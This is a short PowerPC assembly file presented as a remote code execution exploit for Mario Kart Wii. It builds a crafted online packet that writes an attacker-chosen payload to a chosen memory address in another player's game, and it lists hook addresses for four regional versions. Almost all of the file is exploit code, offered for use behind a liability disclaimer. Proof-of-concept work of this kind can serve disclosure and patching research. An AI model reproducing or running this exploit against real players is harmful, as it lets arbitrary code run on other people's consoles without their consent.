#======================================#
# Mario Kart Wii Remote Code Execution #
#--------------------------------------#
# Author : MikeIsAStar                 #
# Date   : 03 Apr 2024                 #
#--------------------------------------#
# Description: This code will inject   #
# arbitrary code into a client's game. #
#--------------------------------------#
# Terms & Conditions: You are fully    #
# responsible for all activity that    #
# occurs while using this code. The    #
# author of this code can not be held  #
# liable to you or to anyone else as a #
# result of damages caused by the      #
# usage of this code.                  #
#======================================#

#======================================#
#         Assembler Directives         #
#======================================#
.set packetSize, packetEnd - packetStart
.set payloadSize, payloadEnd - payloadStart

#======================================#
#             Text Section             #
#======================================#
.section ".text"

#======================================#
#             Hook Address             #
#--------------------------------------#
# RMCP: 0x80657F30                     #
# RMCE: 0x80653AA8                     #
# RMCJ: 0x8065759C                     #
# RMCK: 0x80646248                     #
#======================================#
.globl _start
_start:
    bl        packetEnd

packetStart:
    .long     0x4D696B65
    .long     0x00000000
    .byte     payloadStart - packetStart
    .byte     payloadSize
    .byte     0x00
    .byte     0x00
    .byte     0x00
    .byte     0x00
    .byte     0x00
    .byte     0x00
    .llong    0x4D696B6553746172
    .llong    0x4D696B6553746172
    .long     0x80000000 # Destination address
    .long     0x00000000
payloadStart:
    .long     0x4D696B65
payloadEnd:
packetEnd:

    lis       r12, 0x80005F34@h
    li        r5, packetSize
    mflr      r4
    ori       r12, r12, 0x80005F34@l
    stw       r5, 8(r3)
    mtctr     r12
    lwz       r3, 0(r3)
    bctrl
    li        r4, packetSize
